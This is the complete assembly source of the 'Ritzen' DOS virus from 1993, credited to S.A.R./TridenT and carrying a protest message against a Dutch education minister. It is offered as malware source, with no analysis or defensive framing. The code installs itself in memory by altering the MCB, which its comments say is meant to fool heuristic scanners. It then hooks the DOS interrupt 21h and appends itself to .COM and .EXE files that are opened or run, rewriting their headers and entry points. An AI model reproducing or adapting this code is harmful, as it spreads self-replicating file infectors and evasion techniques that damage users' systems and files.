;*****************************************************************************
;*									     *
;*    The Ritzen Virus 							     *
;*									     *
;*    (c) '93, by S.A.R. (Students Agains Ritzen) / TridenT	     	     *
;*									     *	
;*****************************************************************************

		.model tiny
		.radix 16
		.code

len		equ	offset last - atlantic
len_para	equ	len /10h

mem_size	equ	60h

		org	100h


dummy:		db	0e9h,00h,00h			; dummy file,
							; contains jump to
							; virus code.

atlantic:	call    get_ip				
		sub	bp,offset atlantic+3
		
rest_host:	push	ds
		pop	ax
		mov	cs:[segm+bp],ax
		cmp	cs:[type_host+bp],'E'		; check if host
		je	fix_exe				; is COM or EXE.

fix_com:	lea	si,cs:[com_start+bp]		; fix start of
		mov	ax,es
		inc	ax
		mov	es,ax
		mov	di,00F0h			; com host with
		mov	cx,03h				; original data.
		rep	movsb		
		
		mov	ax,es
		dec	ax
		mov	es,ax

		mov	ax,0100h			; IP start at 0100h.
		push	cs				; store segment+IP 
		push    ax				; on stack.
		jmp	chk_resident

fix_exe:	mov	ax,cs:[exe_cs+bp]		; CS and IP on stack
		mov	bx,ax
		mov	ax,ds
		add	ax,bx
		add	ax,10h
		push	ax
		mov	bx,cs:[exe_ip+bp]
		push	bx				
		
chk_resident:	mov	dx,0aaaah
		mov	ax,3000h
		int	21h
		cmp	dx,0bbbbh
		je	end_install

mem_install:	push	ds				; let DS points
		push	ds
		pop	ax				; to MCB
		dec	ax				; 2 times to fool
		dec	ax				; heuristic scanners
		push	ax
		pop	ds
		cmp	byte ptr ds:[0010],5ah		; last MCB?
		jne	abort_install			; if no, quit.
		
		mov	ax,ds:[0013]			; adjust memory
		sub	ax,mem_size			; size.
		mov	ds:[0013],ax			; store size in MCB.

		pop	ds				; restore original
							; DS segment.
		
		sub	word ptr ds:[0002],mem_size	; don't forget to
							; adjust memory
							; size stored in
							; PSP to.

vir_install:	xchg	ax,bx				; install virus
		mov	ax,es					
		add	ax,bx				; AX = virussegment
		mov	es,ax				
		mov	cs:[vir_seg+bp],ax

		push	cs
		pop	ds
		 
		lea	si,[atlantic+bp]		; copy virus to
		lea	di,es:0103h			; memory
		mov	cx,len
copy:		movsb
		dec	cx
		jnz	copy

		push	ds
		pop	es
 
hook_i21h:	cli
		mov	ax,3521h
		int	21h

		mov	ds,cs:[vir_seg+bp]
		mov	[i21h],bx
		mov	[i21h+2],es

;		mov	dx, offset ds:[mine_i21h]
;		mov	ax,2521h
;		int	21h

		mov	ax,ds
		mov	bx,ax
		mov	dx, offset ds:[mine_i21h]
		xor	ax,ax
		mov	ds,ax
		mov	ds:[4*21h],dx
		mov	ds:[4*21h+2],bx	

		sti
		
		
abort_install:	mov	ax,cs:[segm+bp]
		push	ax
		pop	es
		push	es
		pop	ds

end_install:	retf

;*************************************************************************
;*									 *
;*		I N T E R U P T   H A N D L E R 			 *
;*									 *
;*************************************************************************

mine_i24h:	mov	al,03h
		iret

mine_i21h:	pushf					; check for
		cmp	ax,3000h			; virus ID
                jne     new_21h
		cmp	dx,0aaaah
                jne     new_21h
                mov     dx,0bbbbh                       ; return ID
		popf
		iret


new_21h:	push	ax				; save registers
		push	bx
		push	cx
		push	dx
		push	ds
		push	es
		push	di
		push	si

chk_open:	xchg	ax,bx
		cmp	bh,3dh				; open file?
		je	chk_com

chk_exec:	cmp	bx,04b00h			; execute file?
		je	chk_com

continu:	pop	si				; restore registers
		pop	di
		pop	es
		pop	ds
		pop	dx
		pop	cx
		pop	bx
		pop	ax

next:		popf					; call original
		jmp	dword	ptr cs:[i21h]		; interupt
	
;**************************************************************************
;*									  *
;*		C H E C K  C O M / E X E   F I L E 			  *
;*									  *
;**************************************************************************	


chk_com:	mov	cs:[name_seg],ds
		mov	cs:[name_off],dx
		cld

		mov	cx,0ffh
		push	ds
		pop	es
		push	dx
		pop	di
		mov	al,'.'
		repne	scasb
		cmp	word ptr es:[di],'OC'
                jne     chk_exe
		cmp	word ptr es:[di+2],'M'
                jne	continu
                jmp     infect_com



chk_exe:	cmp	word ptr es:[di],'XE'
		jne	continu
		cmp	word ptr es:[di+2],'E'
		jne 	continu
		jmp	infect_exe



;**************************************************************************
;*									  *
;*		I N F E C T   C O M - F I L E				  *
;*									  *
;**************************************************************************

infect_com:	call	init
		cmp	cs:[fout],0ffh
		je	close_file
		
		mov	cs:[type_host],'C'
		
		mov	ax,4200h	; go to start of file	
		call	mov_point
		
		mov	cx,03h
		mov	ah,3fh
		lea	dx,cs:[com_start]
		call	do_int21h
		
		mov	ax,4200h
		call	mov_point
		mov	ax,4202h
		call	mov_point

		sub	ax,03h
		mov	cs:[lenght_file],ax

		call	write_jmp
		call	write_vir

		call	save_date

close_file:	mov	bx,cs:[handle]
		mov	ah,3eh
		call	do_int21h
		
restore_int24h:	mov	dx,cs:[i24h]
		mov	ds,cs:[i24h+2]
		mov	ax,2524h
		call	do_int21h

		jmp	continu

;**************************************************************************
;*									  *
;*		I N F E C T   E X E - F I L E				  *
;*									  *
;************************************************************************** 	

infect_exe:	call	init
		cmp	cs:[fout],0ffh
		je	close_file
		mov	cs:[type_host],'E'

		mov	ax,4200h
		call	mov_point
		mov	ah,3fh
		mov	cx,18h
		lea	dx,[head_exe]
		call	do_int21h

		call	inf_exe

		call	save_date
		jmp	close_file		


;**************************************************************************
;*									  *
;*		R O U T I N E S						  *
;*									  *
;**************************************************************************

get_ip:		push	sp				; get ip from stack
		pop	bx	
		mov	ax, word ptr cs:[bx]
		mov	bp,ax
		ret
	
init:		mov	cs:[fout],00h
		
		call	int24h
		call	open_file
		jc	error
		call	set_atributes
                call    get_date
		call	chk_infect
		je	error
		ret

error:		mov	cs:[fout],0ffh
		ret


int24h:		push	cs
		pop	ds
		mov	ax,3524h
		call	do_int21h
		mov	cs:[i24h],bx
		mov	cs:[i24h+2],es
		mov	dx, offset mine_i24h
		mov	ax,2524h
		call	do_int21h
		ret

mov_point:	push	cs
		pop	ds
		mov	bx,cs:[handle]
		xor	cx,cx
		xor	dx,dx
		call	do_int21h	
		ret

open_file:	mov	ds,cs:[name_seg]
		mov	dx,cs:[name_off]
		mov	ax,3d02h
		call	do_int21h

		mov	cs:[handle],ax
		mov	bx,ax
		ret

set_atributes:	mov	ax,4200h
		mov	ds,cs:[name_seg]
		mov	dx,cs:[name_off]
		call	do_int21h
		and	cl,0feh
		mov	ax,4301h
		call	do_int21h
		ret

get_date:	mov	bx,cs:[handle]
		mov	ax,5700h
		call	do_int21h
		mov	cs:[date],dx
		mov	cs:[time],cx
		ret

chk_infect:	push	cs
		pop	ds
		mov	ax,4202h
		xor	cx,cx
		sub	cx,01h
		xor	dx,dx
		sub	dx,02h
		mov	bx,cs:[handle]
		call	do_int21h
		
		mov	ah,3fh
		mov	cx,02h
		lea	dx,cs:[file_id]
		call	do_int21h

		mov	al, byte ptr cs:[file_id]
		mov	ah, byte ptr cs:[file_id]+1
		cmp	ax,[virus_id]
		ret

write_jmp:	push	cs
		pop	ds
		mov	ax,4200h
		call	mov_point
		mov	ah,40h
		mov	cx,01h
		lea	dx,cs:[jump]
		call	do_int21h
		
		mov	ah,40h
		mov	cx,02h
		lea	dx,cs:[lenght_file]
		call	do_int21h
		ret
	
write_vir:	push	cs
		pop	ds
		mov	ax,4202h
		call	mov_point
		mov	ah,40h
		mov	cx,len
		mov	dx,103h
		call	do_int21h
		ret	

save_date:	mov	ax,5700h
		call	do_int21h
		mov	cs:[date],dx
		mov	cs:[time],cx
		ret
		
inf_exe:	mov	ax,word ptr cs:[head_exe+14h]
		mov	cs:[exe_ip],ax
		mov	ax, word ptr cs:[head_exe+16h]
		mov	cs:[exe_cs],ax

		mov	ax,4200h
		call	mov_point
		mov	ax,4202h
		call	mov_point
		mov	bx,10h
		div	bx
		sub	ax, word ptr cs:[head_exe+08h]
		mov	cs:[new_cs],ax
		mov	cs:[new_ip],dx

		call	write_vir

		mov	ax,4200h
		call	mov_point
		mov	ax,4202h
		call	mov_point
		mov	bx,0200h
		div	bx
		cmp	dx,0000h
		jne	not_zero
		jmp	zero
not_zero:	inc	ax
zero:		mov	word ptr cs:[head_exe+02h],dx
		mov	word ptr cs:[head_exe+04h],ax
		mov	ax,cs:[new_ip]
		mov	word ptr cs:[head_exe+14h],ax
		mov	ax,cs:[new_cs]
		mov	word ptr cs:[head_exe+16h],ax
		mov	word ptr cs:[head_exe+0Eh],ax
		add	word ptr cs:[head_exe+10],len_para
		
;		mov	word ptr cs:[head_exe+10],1000

		mov	ax,4200h
		call	mov_point

		mov	ah,40h
		mov	bx,cs:[handle]
		mov	cx,18h
		lea	dx,cs:[head_exe]

		call	do_int21h
		ret
		
do_int21h:	pushf
		call	dword ptr cs:[i21h]
		ret

;****************************************************************************
;*									    *
;*		D A T A							    *
;*									    *
;****************************************************************************

type_host	db	'C'
com_start	db	0cdh,20h,90h
message		db	" Dedicated to Ritzen, our Minister of Education and Science."
		db      " We are getting sick of your budget cuts so we hope that"
		db      " you get sick of this virus.."
		db	" (c) '93 by S.A.R. / TridenT ."
exe_cs		dw	?
exe_ip		dw	?
new_cs		dw	?
new_ip		dw	?
vir_seg		dw	?
i21h		dw	00h,00h
i24h		dw	00h,00h
name_seg	dw	?
name_off	dw	?
lenght_file	dw	?
head_exe	db	18 dup (?)
handle		dw	?
fout		db	?
file_id		dw	?
jump		db	0e9h
date		dw	?	
time		dw	?
segm		dw	?
virus_id	dw	"AP"
last		dw	"AP"

		end	dummy 	
